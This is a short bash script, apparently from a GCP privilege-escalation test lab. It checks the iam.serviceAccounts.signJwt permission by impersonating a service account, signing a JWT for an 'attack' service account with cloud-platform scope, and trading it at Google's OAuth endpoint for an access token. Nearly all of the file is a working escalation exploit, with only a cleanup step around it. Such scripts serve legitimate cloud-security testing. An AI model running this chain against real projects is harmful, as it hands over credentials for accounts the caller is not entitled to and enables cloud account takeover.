#!/bin/bash

source lib/lib.sh

echo "================================================"
echo "Checking iam.serviceAccounts.signJwt"

modify_role "iam.serviceAccounts.signJwt"

JWT_UNSIGNED="{\"iss\":\"${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com\",\"scope\":\"https://www.googleapis.com/auth/iam https://www.googleapis.com/auth/cloud-platform\",\"aud\":\"https://accounts.google.com/o/oauth2/token\",\"exp\":$(( `date +%s` + 3600)),\"iat\":$(date +%s)}"

echo -n "$JWT_UNSIGNED" > /tmp/input.jwt

gcloud --impersonate-service-account="${SERVICE_ACCOUNT_ID}@${PROJECT_ID}.iam.gserviceaccount.com" \
  beta iam service-accounts sign-jwt --iam-account="${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com" /tmp/input.jwt /tmp/output.jwt

JWT_SIGNED=$(cat /tmp/output.jwt)

curl "https://accounts.google.com/o/oauth2/token"\
  -d "grant_type=assertion&assertion_type=http://oauth.net/grant_type/jwt/1.0/bearer&assertion=$JWT_SIGNED" \
  -H "Content-type: application/x-www-form-urlencoded"

echo ""

# Cleaning
echo "You should see a token previous to this message"
read -p "Press any key to delete scenario... " -n1 -s
echo ""

rm /tmp/input.jwt /tmp/output.jwt

echo "================================================"
